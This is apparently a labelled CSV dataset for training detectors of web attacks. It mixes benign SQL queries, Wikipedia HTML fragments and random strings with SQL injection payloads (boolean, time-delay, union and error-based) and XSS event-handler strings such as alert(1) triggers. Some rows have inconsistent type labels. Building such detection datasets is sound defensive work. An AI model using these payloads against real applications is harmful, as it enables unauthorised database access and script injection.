Text,Label,type
-3899'  )   where 8152  =  8152 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,sql
8.25977E+15,0,sql
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",1,sql
DELETE FROM section WHERE underline = 'shoot',0,sql
<ul>,0,xss
        <dt>Versions</dt>,0,xss
-2364' or 6743  =  7578,1,sql
"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",1,sql
tiena,0,sql
SELECT apart ( s )  FROM top SELECT service FROM clearly,0,sql
"select * from generate_series  (  7610,7610,case when   (  7610  =  9416  )   then 1 else 0 end  )   limit 1--",1,sql
1'  )   as mwpp where 6192  =  6192,1,sql
SELECT * FROM exclaimed WHERE heading NOT BETWEEN 'muscle' AND 'continued',0,xss
"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
"	 </span> <span class=""reference-text"">",0,xss
"1'  )   as viex where 6242  =  6242 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
1 where 8180  =  8180 or sleep  (  5  )  #,1,xss
1' where 3900  =  3900 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
"calle camino getafe, 157,",0,sql
"1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
49515,0,sql
manferidor,0,sql
"-4256'  )   where 9545  =  9545 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,xss
"-5313'  )   union all select 7187,7187,7187#",1,sql
1  )   as mtda where 3951  =  3951,1,sql
"    <div class=""rst-footer-buttons"" role=""navigation"" aria-label=""footer navigation"">",0,xss
SELECT TOP 3 * FROM whispered WHERE funny = 'map' SELECT * FROM draw,0,xss
amaja,0,sql
SELECT * FROM public FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<li><a href=""/wiki/Na%C3%AFve_realism"" title=""Naïve realism"">Naïve realism </a>",0,xss
"	 </span> <span class=""reference-text"">",0,xss
chap8n,0,xss
SELECT * FROM tribe ORDER BY river,0,sql
SELECT feet ( s )  FROM contain SELECT swimming FROM topic,0,xss
select case when 5559  =  3483 then 1 else null end--,1,sql
SELECT string ( s )  FROM possible SELECT knew ( s ) ,0,sql
SELECT * FROM dish WHERE mail = 'wet',0,sql
SELECT * FROM arrangement WHERE design = 'sheep' FETCH FIRST 3 ROWS ONLY,0,sql
5.37091E+14,0,sql
SELECT * FROM neighbor,0,sql
 </li>,0,xss
-1470'   )    )     )   or 9323  =  9323#,1,sql
SELECT * FROM anywhere WHERE clothes = 'press'  AND City = 'wagon',0,sql
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Programming_language_theory"" title=""Programming language theory"">Software notations </a><br />and <a href=""/wiki/Programming_tool"" title=""Programming tool"">tools </a> </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
SELECT next ( s ) FROM cattle INNER JOIN,0,sql
SELECT * FROM supply FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
DELETE FROM remove,0,sql
<input2 onpointerleave=alert(1)>XSS</input2>,2,xss
boimorto,0,sql
"<ul><li><a href=""/wiki/Programmable_metallization_cell"" title=""Programmable metallization cell"">CBRAM </a> </li>",0,xss
modigh,0,sql
SELECT TOP 3 * FROM curious SELECT * FROM halfway 3SELECT * FROM telephone,0,sql
SELECT up FROM recently UNION ALL SELECT thank FROM tip ORDER BY pack,0,sql
SELECT AVG ( mix ) FROM write SELECT SUM ( harder ) ,0,sql
"<li><cite id=""CITEREFNRC1999"" class=""citation book""><a href=""/wiki/United_States_National_Research_Council"" class=""mw-redirect"" title=""United States National Research Council"">NRC (United States National Research Council) </a> (1999). ""Developments in Artificial Intelligence"". <i>Funding a Revolution: Government Support for Computing Research </i>. National Academy Press. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Developments+in+Artificial+Intelligence&amp;rft.btitle=Funding+a+Revolution%3A+Government+Support+for+Computing+Research&amp;rft.pub=National+Academy+Press&amp;rft.date=1999&amp;rft.au=NRC+%28United+States+National+Research+Council%29&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
12230,0,sql
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Tech+Insider&amp;rft.atitle=The+mysterious+artificial+intelligence+company+Elon+Musk+invested+in+is+developing+game-changing+smart+computers&amp;rft_id=http%3A%2F%2Fwww.techinsider.io%2Fmysterious-artificial-intelligence-company-elon-musk-investment-2015-10&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
29127,0,sql
bevis,0,sql
SELECT * FROM chain WHERE education = 'continued' LIMIT 3,0,sql
dobbing3,0,sql
magalia,0,sql
1  )   as boed where 6787  =  6787,1,xss
SELECT * FROM  ( SELECT other FROM saddle ) ,0,sql
"-4095'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,sql
-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,sql
"	 </span> </a> </i>&#93; </sup>, including <a href=""/wiki/Computer_vision"" title=""Computer vision"">computer vision </a>, <a href=""/wiki/Speech_recognition"" title=""Speech recognition"">speech recognition </a>, <a href=""/wiki/Natural_language_processing"" title=""Natural language processing"">natural language processing </a> and others.<sup id=""cite_ref-goodfellow2016_247-0"" class=""reference""><a href=""#cite_note-goodfellow2016-247"">&#91;236&#93; </a> </sup><sup id=""cite_ref-HintonDengYu2012_248-0"" class=""reference""><a href=""#cite_note-HintonDengYu2012-248"">&#91;237&#93; </a> </sup><sup id=""cite_ref-schmidhuber2015_246-1"" class=""reference""><a href=""#cite_note-schmidhuber2015-246"">&#91;235&#93; </a> </sup>",0,xss
SELECT * FROM sound WHERE stove = 'empty' LIMIT 3,0,sql
<head id=x tabindex=1 onbeforeactivate=alert(1)></head>,2,xss
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",2,xss
grajera sampol,0,xss
"<li id=""cite_note-Dreyfus&#39;_critique-355""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Dreyfus&#39;_critique_355-0"">^ </a> </b> ",0,xss
"   SELECT COUNT ( blanket ) , took FROM none BY seat",0,sql
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",2,xss
SELECT * FROM butter WHERE complete = 'produce' LIMIT 3,0,sql
"1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
<acronym onpointerenter=alert(1)>XSS</acronym>,2,xss
"	 </span> <span class=""reference-text"">",0,xss
SELECT doubt ( s )  FROM composition SELECT worth ( s ) ,0,xss
SELECT * FROM seeing  WHERE vegetable NOT LIKE '[world]%',0,xss
SELECT DISTINCT typical FROM discover,0,sql
SELECT Count ( * )  AS doctor,0,sql
50420,0,sql
"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",1,xss
SELECT learn ( s )  FROM decide FULL OUTER JOIN,0,sql
"<cite oncontextmenu=""alert(1)"">test</cite>",2,xss
	 </span> </li>,0,xss
